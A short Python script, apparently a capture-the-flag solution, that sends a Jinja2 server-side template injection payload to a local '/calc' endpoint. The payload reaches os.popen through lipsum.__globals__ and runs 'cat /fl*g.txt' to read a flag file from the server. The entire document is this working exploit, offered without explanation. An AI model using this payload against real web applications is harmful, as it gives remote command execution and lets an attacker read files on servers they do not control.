import requests

r = requests.get("http://127.0.0.1:20207/calc", params={"calc":"lipsum.__globals__.os.popen('cat /fl*g.txt').read()"})

print(r.text)
